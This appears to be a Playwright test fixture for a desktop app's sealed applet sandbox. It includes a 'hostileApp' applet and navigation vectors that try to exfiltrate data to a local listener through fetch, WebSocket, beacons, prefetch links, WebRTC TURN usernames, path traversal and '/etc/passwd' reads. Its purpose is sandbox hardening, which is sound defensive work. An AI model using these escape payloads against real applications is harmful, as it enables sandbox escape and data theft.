// T-335 sealed applets in the drawer, on the new shell's made-up world (shapeFixture.ts) with applet notes added: each one an HTML note
// tagged `applet`, its metadata the pair {applet, interface}. Also a few data notes the applets read (Seeds/, inside a typical prefix) and
// one private note outside every prefix. Every name and word here is invented.
// How it works: bootShape boots the world; then this adds an init script and reloads, so it runs after the world's own in every frame:
// - in the top frame it wraps the fake Tauri's invoke (applet notes, the path listing, search over the added notes) and seeds the
//   self-test pass and grants in localStorage;
// - in a child frame (the sealed frame and its children) it removes the world's fake Tauri, as the real Tauri injects its internals
//   into the main frame only; and, unless `webrtc: 'native'`, it removes WebRTC in every frame (a webview without it).
import dgram from 'node:dgram';
import http from 'node:http';
import type { Page } from '@playwright/test';
import { bootShape, ROOM, type ShapeOpts } from './shapeFixture';
import { grantKey, htmlHash } from '../../src/interface/manifest.ts';
import { appletHostNeeds } from '../../src/interface/sealedApplet.ts';

export { ROOM };

export type FixtureApplet = {
  id: string; name: string; html: string;
  /** The interface manifest; default: reads Seeds/ only. `null`: no `interface` key (the default needs, all `area`). */
  interface?: unknown;
  /** Extra or replaced keys of the applet manifest (the `applet` metadata). */
  applet?: Record<string, unknown>;
  /** Where its note lives (default `Seeds/<name>`: an applet's note sits in the folder it reads). */
  path?: string;
};
export type SealedOpts = ShapeOpts & {
  applets?: FixtureApplet[];
  /** Seed a grant for every applet (true, the default) or none (false); computed as the app computes it. */
  granted?: boolean;
  /** Ids of applets whose grant records an OLDER html hash (the applet changed since it was allowed). */
  staleHtml?: string[];
  /** A stored sandbox self-test pass for this platform, version and webview (default true). */
  selftest?: boolean;
  mode?: 'sealed' | 'approved-code';
  /** The mode the seeded grants were made under ('legacy': a record without one). Default: `mode`. */
  grantedUnder?: 'sealed' | 'approved-code' | 'legacy';
  /** 'off' (default): a webview without WebRTC. 'native': Chromium's own, also in child frames. */
  webrtc?: 'off' | 'native';
  /** A webview that delivers IPC into every frame (wry/WebKitGTK or Android). */
  ipcLeak?: boolean;
  /** The self-test's probe frame loses its CSP (a test hook in ProbeFrame). */
  stripCsp?: boolean;
  /** The page is served without the host CSP. */
  noHostCsp?: boolean;
  /** The stored pass was recorded under this user agent. */
  passUa?: string;
  /** getVersion() fails. */
  versionFails?: boolean;
};

export const SEEDS_DATA = [
  { id: 'n-tomato', path: 'Seeds/Tomato', content: 'Tomato: Sungold, sow indoors in March. Germination 6 days.' },
  { id: 'n-bean', path: 'Seeds/Bean', content: 'Bean: Blue Lake pole beans, sow after the last frost.' },
  { id: 'n-diary', path: 'Private/Diary', content: 'PRIVATE-DIARY-WORDS: a made-up line no applet may read.' },
];

/** The default applet: a seed list that reads Seeds/ and shows what it got, and what it was refused. */
export const SEED_LIST = `<!doctype html><html><body><h1 id="title">…</h1><ul id="seeds"></ul><pre id="out">{}</pre><script>
const R = {};
const show = () => { document.getElementById('out').textContent = JSON.stringify(R); };
const settle = (k, p) => p.then((v) => { R[k] = v; }, (e) => { R[k] = { error: e.code || e.message }; }).then(show);
(async () => {
  await settle('ctx', uni.ready().then((c) => c.applet));
  document.getElementById('title').textContent = R.ctx && R.ctx.name;
  await settle('list', uni.vault.queryNotes({ pathPrefix: 'Seeds/' }).then((l) => l.map((n) => n.path)));
  for (const p of R.list || []) { const li = document.createElement('li'); li.textContent = p.split('/').pop(); document.getElementById('seeds').appendChild(li); }
  await settle('tomato', uni.vault.getNote('Seeds/Tomato').then((n) => n && n.content));
  await settle('diary', uni.vault.getNote('Private/Diary'));
  await settle('diaryById', uni.vault.queryNotes({ id: 'n-diary', includeContent: true }));
  await settle('outsidePrefix', uni.vault.queryNotes({ pathPrefix: 'Private/' }));
  await settle('search', uni.vault.queryNotes({ search: 'a' }).then((l) => l.map((n) => n.path)));
  await settle('recent', uni.chat.recent(3));
  await settle('parentDoc', Promise.resolve().then(() => parent.document.title));
  await settle('topHref', Promise.resolve().then(() => top.location.href));
  await settle('tauri', Promise.resolve().then(() => typeof window.__TAURI_INTERNALS__));
  R.done = true; show();
})();
</script></body></html>`;

export const seedListApplet = (over: Partial<FixtureApplet> = {}): FixtureApplet => ({ id: 'seed-list', name: 'Seed list', html: SEED_LIST, ...over });

const appletMeta = (a: FixtureApplet) => ({
  applet: { contract: 1, id: a.id, name: a.name, kind: 'vault', where: 'Seeds folder, in your vault', searches: ['seeds'], ...(a.applet ?? {}) },
  ...(a.interface === null ? {} : { interface: a.interface ?? { contract: 1, needs: [{ 'vault.read': 'Seeds/' }] } }),
});
export const noteIdOf = (a: FixtureApplet) => `applet-${a.id}`;
export const pathOf = (a: FixtureApplet) => a.path ?? `Seeds/${a.name}`;

export async function bootSealed(page: Page, o: SealedOpts = {}) {
  const applets = o.applets ?? [seedListApplet()];
  const mode = o.mode ?? 'sealed';
  const grantedUnder = o.grantedUnder ?? mode;
  // the grants, keyed as the app keys them: what the needs resolve to plus the note's path, and the html's hash
  const grants: Record<string, unknown> = {};
  if (o.granted !== false) {
    for (const a of applets) {
      const h = appletHostNeeds(appletMeta(a), Object.values(ROOM));
      if (!h.ok) continue;
      const html = await htmlHash(a.html);
      grants[noteIdOf(a)] = { scope: await grantKey(h.resolved, pathOf(a)), html: (o.staleHtml ?? []).includes(a.id) ? `stale-${html}` : html,
        grantedAt: '2026-11-01T00:00:00Z', ...(grantedUnder === 'legacy' ? {} : { grantedUnder }) };
    }
  }
  const notes = [
    ...applets.map((a) => ({ id: noteIdOf(a), path: pathOf(a), extension: 'html', tags: ['applet'], content: a.html, metadata: appletMeta(a), updatedAt: '2026-11-09T10:00:00Z', createdAt: '2026-11-01T10:00:00Z' })),
    ...SEEDS_DATA.map((n) => ({ ...n, extension: 'md', tags: [], metadata: {}, updatedAt: '2026-11-08T10:00:00Z', createdAt: '2026-11-01T10:00:00Z' })),
  ];
  if (o.noHostCsp) {
    await page.route((u) => new URL(u).pathname === '/', async (route) => {
      const response = await route.fetch();
      const headers = { ...response.headers() };
      delete headers['content-security-policy'];
      await route.fulfill({ response, headers });
    });
  }
  await bootShape(page, o);
  await page.addInitScript((d) => {
    const w = window as any;
    if (d.ipcLeak) w.ipc = { postMessage: () => {} };
    if (d.stripCsp) w.__areasTest = { stripCsp: true };
    // runs in every frame, srcdoc children included, before their scripts
    if (d.webrtcOff) for (const n of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection', 'RTCDataChannel', 'RTCSessionDescription', 'RTCIceCandidate']) { try { Object.defineProperty(window, n, { value: undefined, configurable: true, writable: false }); } catch { /* already defined */ } }
    // Tauri injects its internals into the main frame only (for_main_frame_only: true): the world's fake must not reach a sealed frame
    if (window.top !== window) { delete w.__TAURI_INTERNALS__; delete w.__TAURI_EVENT_PLUGIN_INTERNALS__; return; }
    const ua = navigator.userAgent;
    const platform = /Android/i.test(ua) ? 'android' : /Mac OS X|Macintosh|iPhone|iPad/i.test(ua) ? 'mac' : /Linux|X11/i.test(ua) ? 'linux' : 'other';
    if (d.selftest && !localStorage.getItem('uni.areaApps.selftest.v1')) localStorage.setItem('uni.areaApps.selftest.v1', JSON.stringify({ platform, passedAt: '2026-11-01T00:00:00Z', appVersion: 'dev', runtime: 'wry test tauri test', mode: d.mode, userAgent: d.passUa ?? ua }));
    if (!sessionStorage.getItem('test.sealedSeeded')) {
      sessionStorage.setItem('test.sealedSeeded', '1');
      if (Object.keys(d.grants).length) localStorage.setItem('uni.interface.grants.v2', JSON.stringify(d.grants));
    }
    const T = w.__TAURI_INTERNALS__;
    const inner = T.invoke;
    const notes: any[] = d.notes;
    // a test changes a note in place (its manifest, path or html) to stand for an edit in the vault
    w.__sealedNotes = notes;
    const copy = (x: unknown) => JSON.parse(JSON.stringify(x));
    const find = (ref: string) => notes.find((n) => n.id === ref || n.path === ref);
    T.invoke = async (cmd: string, args: any) => {
      const mine = (v: unknown) => { w.__calls.push({ cmd, args }); return v; };
      switch (cmd) {
        case 'plugin:app|version': if (d.versionFails) { w.__calls.push({ cmd, args }); throw 'version unavailable'; } break;
        case 'vault_query': if (args.tag === 'applet' && (!args.vault || args.vault === 'uni')) return mine(copy(notes.filter((n) => n.tags.includes('applet')).map(({ content, ...n }) => n)));
          break;
        case 'vault_note': {
          const n = find(args.noteRef);
          if (!n) break;
          w.__calls.push({ cmd, args });
          if ((w.__noteFails ?? {})[args.noteRef]) throw 'hub unreachable: connection refused';
          return { hub: 'https://example.invalid', vault: args.vault ?? 'uni', note: copy(n) };
        }
        case 'vault_paths': return mine(notes.map((n) => ({ id: n.id, path: n.path, extension: n.extension, updatedAt: n.updatedAt })));
        case 'vault_search': {
          const q = String(args.query).toLowerCase();
          const own = notes.filter((n) => n.extension !== 'html' && n.content.toLowerCase().includes(q) && (!args.pathPrefix || n.path.startsWith(args.pathPrefix)))
            .map((n) => ({ vault: 'uni', id: n.id, path: n.path, snippet: n.content, score: null, mode: 'keyword' }));
          const rest = await inner(cmd, args);
          return [...own, ...rest].slice(0, args.limit ?? 20);
        }
      }
      return inner(cmd, args);
    };
  }, { notes, grants, mode, passUa: o.passUa ?? null, selftest: o.selftest ?? true, webrtcOff: (o.webrtc ?? 'off') === 'off', ipcLeak: !!o.ipcLeak, stripCsp: !!o.stripCsp, versionFails: !!o.versionFails });
  await page.reload();
}

/** Open the drawer from the bar and tap an applet's tile under "From your vault". */
export async function openFromDrawer(page: Page, name: string) {
  const drawer = page.getByRole('dialog', { name: 'Applets' });
  // (an applet's Back already shows the drawer: the bar's button would close it)
  if (!(await drawer.isVisible())) await page.getByRole('navigation', { name: 'Places' }).getByRole('button', { name: /^Applets/ }).click();
  await drawer.getByRole('region', { name: 'From your vault' }).getByRole('button', { name, exact: true }).click();
}

/** The vault reads made for the applets (their notes and the data notes), not the shell's own (its profile, the rooms registry). */
export const appletReads = (page: Page) => page.evaluate((refs) => (window as any).__calls.filter((c: any) => c.cmd === 'vault_note' && refs.includes(c.args.noteRef)).map((c: any) => c.args.noteRef),
  [...SEEDS_DATA.flatMap((n) => [n.id, n.path])]);

/** Settings → Developer, where the sandbox self-test is. */
export async function openDeveloper(page: Page) {
  await page.getByRole('navigation', { name: 'Places' }).getByRole('button', { name: /^Rooms/ }).click();
  await page.getByRole('button', { name: 'Settings' }).click();
  await page.locator('.settings-dev > summary').click();
}

export type Ports = { http: number; udp: number };

/** Every attack from inside the frame; what it saw goes into #out. Its grant: Seeds/, and chat in Uni's room (for the draft flood). */
export const hostileApp = (ports: Ports) => `<!doctype html><html><body><pre id="out">running</pre><script>
(async () => {
  const R = {}, LEAK = ${JSON.stringify(`http://127.0.0.1:${ports.http}/leak`)}, TURN = ${JSON.stringify(`turn:127.0.0.1:${ports.udp}`)};
  const attempt = async (k, fn) => { try { const v = await fn(); R[k] = 'LEAK:' + String(v).slice(0, 60); } catch (e) { R[k] = 'blocked:' + (e && e.name || 'error'); } };
  const settle = (make) => new Promise((res) => { const t = setTimeout(() => res('blocked:timeout'), 1500); make((v) => { clearTimeout(t); res(v); }); });
  await attempt('fetch', () => fetch(LEAK + '?fetch').then((r) => r.status));
  R.xhr = await settle((done) => { try { const x = new XMLHttpRequest(); x.open('GET', LEAK + '?xhr'); x.onload = () => done('LEAK:xhr'); x.onerror = () => done('blocked:error'); x.send(); } catch (e) { done('blocked:' + e.name); } });
  R.ws = await settle((done) => { try { const w = new WebSocket('ws://127.0.0.1:${ports.http}/ws'); w.onopen = () => done('LEAK:ws'); w.onerror = () => done('blocked:error'); w.onclose = () => done('blocked:close'); } catch (e) { done('blocked:' + e.name); } });
  R.img = await settle((done) => { const i = new Image(); i.onload = () => done('LEAK:img'); i.onerror = () => done('blocked:error'); i.src = LEAK + '?img'; });
  await attempt('topRead', () => top.location.href);
  await attempt('topWrite', () => { top.location.href = LEAK + '?nav'; return 'no-throw'; });
  await attempt('parentDoc', () => parent.document.title);
  await attempt('tauri', () => typeof window.__TAURI_INTERNALS__ !== 'undefined' ? 'present' : (() => { throw Object.assign(new Error(), { name: 'absent' }); })());
  await attempt('parentTauri', () => parent.__TAURI_INTERNALS__);
  // Chromium throws in an opaque origin; WebKit returns '' (so only a value, or a write that persists, is a leak).
  await attempt('cookie', () => { const v = document.cookie; if (v) return v; document.cookie = 'leak=1'; if (document.cookie.indexOf('leak') >= 0) return 'persisted'; throw Object.assign(new Error(), { name: 'empty' }); });
  await attempt('storage', () => localStorage.length);
  await attempt('eval', () => eval('1+1'));
  await attempt('popup', () => { const w = window.open(LEAK + '?popup'); if (!w) throw Object.assign(new Error(), { name: 'null' }); return 'opened'; });
  const frame = document.createElement('iframe'); frame.src = LEAK + '?frame'; document.body.appendChild(frame);
  R.frame = await settle((done) => { frame.onload = () => done(frame.contentWindow ? 'loaded' : 'blocked:none'); frame.onerror = () => done('blocked:error'); setTimeout(() => done('blocked:not-loaded'), 1200); });
  for (const rel of ['dns-prefetch', 'preconnect', 'prefetch', 'prerender']) { const l = document.createElement('link'); l.rel = rel; l.href = LEAK.replace('/leak', '') + '/' + rel; document.head.appendChild(l); }
  await attempt('beacon', () => { if (!navigator.sendBeacon(LEAK + '?beacon', 'x')) throw new Error('refused'); return 'queued'; });
  R.rtc = typeof RTCPeerConnection === 'undefined' && typeof webkitRTCPeerConnection === 'undefined' ? 'blocked:absent' : 'present';
  await attempt('rtcNew', () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: TURN, username: 'SECRETUSER', credential: 'x' }] }); pc.createDataChannel('x'); return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => 'constructed'); });
  // A srcdoc child frame is a fresh realm: the in-frame neutraliser never ran there.
  const kid = document.createElement('iframe');
  kid.srcdoc = '<script>try{var pc=new RTCPeerConnection({iceServers:[{urls:' + JSON.stringify(TURN) + ',username:"A-PRIVATE-ROOM-MESSAGE",credential:"x"}]});pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}<\\/script>';
  document.body.appendChild(kid);
  await new Promise((r) => setTimeout(r, 1500));

  const replies = {};
  addEventListener('message', (e) => { const m = e.data; if (m && (m.uni === 1 || m.pfr === 1) && m.id) (replies[m.id] = replies[m.id] || []).push(m); });
  const send = (m) => parent.postMessage(m, '*');
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const U = (id, ns, method, params, extra) => send({ uni: 1, id, ns, method, params, ...(extra || {}) });
  const F = (id, path, method) => send({ pfr: 1, channel: 'vault', id, method: method || 'GET', path, headers: {}, body: null });
  U('unk', 'fs', 'read', { path: '/etc/passwd' });
  U('unm', 'vault', 'constructor', {});
  U('big', 'chat', 'draft', { text: 'x'.repeat(9000) });
  U('room', 'chat', 'draft', { text: 'to another room', room: ${JSON.stringify(ROOM.river)} });
  U('out1', 'note', 'open', { ref: 'Private/Diary' });
  U('out2', 'note', 'open', { ref: 'Seeds/../Private/Diary' });
  U('out3', 'note', 'open', { ref: '/etc/passwd' });
  U('extra', 'theme', 'get', {}, { sneaky: true });
  F('v1', '/api/notes/' + encodeURIComponent('Private/Diary'));
  F('v2', '/api/notes?path_prefix=' + encodeURIComponent('Private/'));
  F('v3', '/api/notes?id=n-diary&include_content=true');
  F('v4', '/api/notes?search=PRIVATE');
  F('v5', '/api/notes?path_prefix=' + encodeURIComponent('Seeds/../Private/'));
  F('v6', '/api/notes', 'POST');
  F('v7', '/api/notes/' + encodeURIComponent('Seeds/Own'));
  send('garbage'); send(null); send({ uni: 1 }); send({ uni: 1, id: 'z'.repeat(100), ns: 'theme', method: 'get' }); send({ uni: 2, id: 'ver', ns: 'theme', method: 'get' });
  await wait(700);
  const first = (id) => (replies[id] || []).map((m) => (m.error && m.error.code) || (m.pfr ? 'http' + m.status : 'result')).join(',') || 'none';
  const known = ['unk', 'unm', 'big', 'room', 'out1', 'out2', 'out3', 'extra', 'v1', 'v2', 'v3', 'v4', 'v5', 'v6', 'v7', 'ver'];
  for (const id of known) R['c:' + id] = first(id);
  R.vaultBodies = known.filter((k) => k[0] === 'v' && k.length === 2).map((k) => (replies[k] || []).map((m) => m.body || '').join('')).join('|');
  R['c:longid'] = Object.keys(replies).some((k) => k.length > 64) ? 'replied' : 'none';
  R.stray = Object.keys(replies).filter((k) => !known.includes(k)).join(',') || 'none';
  for (let i = 0; i < 6; i++) U('s' + i, 'chat', 'draft', { text: 'suggestion ' + i });
  await wait(500);
  R.suggest = JSON.stringify([0, 1, 2, 3, 4, 5].map((i) => first('s' + i)));
  for (let i = 0; i < 100; i++) U('f' + i, 'theme', 'get', {});
  await wait(1200);
  let okN = 0, errN = 0, other = 0;
  for (let i = 0; i < 100; i++) { const m = (replies['f' + i] || [])[0]; if (!m) other++; else if ('error' in m) errN++; else okN++; }
  R.flood = JSON.stringify({ ok: okN, err: errN, none: other });
  document.getElementById('out').textContent = JSON.stringify(R);
})();
</script></body></html>`;
export const HOSTILE_NEEDS = { contract: 1, needs: [{ 'vault.read': 'Seeds/' }, { 'chat.read': ROOM.uni }, { 'chat.draft': ROOM.uni }] };

/** A late navigation (after the frame loaded), one per vector. The listener must never see it. */
export const navApp = (vector: 'self' | 'meta' | 'anchor' | 'write' | 'parse', ports: Ports) => {
  const url = `http://127.0.0.1:${ports.http}/leak?nav=${vector}`;
  const code = {
    self: `location.href = ${JSON.stringify(url)};`,
    meta: `const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${url}'; document.head.appendChild(m);`,
    anchor: `const a = document.createElement('a'); a.href = ${JSON.stringify(url)}; document.body.appendChild(a); a.click();`,
    write: `document.open(); document.write('<meta http-equiv="refresh" content="0;url=${url}">'); document.close();`,
    parse: `location.href = ${JSON.stringify(url)};`,
  }[vector];
  // Navigating while the page is still parsing: no `load` ever follows, so a load counter can't see it.
  if (vector === 'parse') return `<!doctype html><html><body><p>nav parse</p><script>${code}</script></body></html>`;
  return `<!doctype html><html><body><p>nav ${vector}</p><script>addEventListener('load', () => setTimeout(() => { ${code} }, 150));</script></body></html>`;
};
/** A local "attacker": an HTTP server and a UDP socket (the TURN port). Any hit means the sandbox leaked. */
export async function startListener() {
  const urls: string[] = [];
  const datagrams: string[] = [];
  const server = http.createServer((req, res) => { urls.push(req.url ?? ''); res.writeHead(200, { 'content-type': 'text/html', 'access-control-allow-origin': '*' }); res.end('<p>remote</p>'); });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const udp = dgram.createSocket('udp4');
  udp.on('message', (m) => datagrams.push(m.toString('latin1')));
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', r));
  const ports: Ports = { http: (server.address() as { port: number }).port, udp: udp.address().port };
  return {
    ports, urls, datagrams,
    async close() { server.closeAllConnections?.(); await new Promise<void>((r) => server.close(() => r())); udp.close(); },
  };
}
